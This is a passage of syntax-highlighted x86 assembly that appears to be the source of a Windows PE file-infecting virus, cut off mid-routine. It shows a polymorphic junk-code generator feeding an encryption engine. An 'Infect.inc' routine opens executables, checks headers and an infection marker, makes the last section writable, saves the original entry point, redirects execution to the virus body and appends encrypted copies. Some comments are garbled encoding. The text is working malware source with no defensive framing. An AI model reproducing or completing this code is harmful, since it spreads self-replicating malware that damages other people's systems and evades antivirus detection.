    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NoReg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetReg</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetRegNum</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CheckN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">JJRet</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoBit</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NoBit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckN</span><span class="sc0">
</span><span class="sc5">JJRet</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetRegNum</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FreeMask</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">btr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FreeMask</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SetMask</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SetMask</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------</span><span class="sc0">
</span><span class="sc5">GarbLvl</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GarbTbl</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_XchgEax</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_PushPop</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_Nop</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_GenJxx</span><span class="sc0">

    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_MovRegImm</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">G_MovRegReg</span><span class="sc0">
</span><span class="sc5">GarbLen</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">GarbTbl</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">G_XchgEax</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegMask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">EaxUsed</span><span class="sc0">

</span><span class="sc1">;   xor eax,eax</span><span class="sc0">
</span><span class="sc1">;   Call    CheckReg</span><span class="sc0">
</span><span class="sc1">;   jnc EaxUsed</span><span class="sc0">
</span><span class="sc1">;   Call    GetNotFreeReg</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">DoGarble</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">EaxUsed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">G_PushPop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">FreeMask</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">DoGarble</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SetMask</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">G_Nop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">G_MovRegImm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bReg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">bReg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">G_MovRegReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetAnyReg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">G_Jxx</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">G_GenJxx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">G_Jxx</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MaxJumps</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoJmpz</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">DoGarble</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">G_Jxx</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NoJmpz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Infect.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Infection appenging to last section</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CreateFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc5">SHARE_READ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ?ð¯ ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">nextone</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; -ð¢ÿ?¿ header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">scasw</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">12h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'DM'</span><span class="sc0">
    </span><span class="sc6">scasw</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseIt</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">3Ch</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; -ÿ PE ÿ?R&lt;R÷Rò</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; -ð¢ÿ?¿</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">            </span><span class="sc1">; PE ?</span><span class="sc0">
    </span><span class="sc6">scasd</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CloseIt</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; ?R¡&lt;?ý-¯¯ ¡?ò¦ð¯</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0C0000000h</span><span class="sc0">  </span><span class="sc1">; Read+Write</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; ÷ òR-?¦ ¡?ò¦ðð</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldHost</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">VTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VEntry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FLen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VEntry</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">VEntry</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; ð¢ «? ¿ÿ-ðô£&lt;¯¦ðð ¡ ÿýý ?¡R¿</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; ô? ?¿?--Rc ÿ ô ?ý?&lt;R¿ ÷ð £¡ÿ</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">DME</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cVirFullLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cVirLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">cVirFullLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">cVirLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
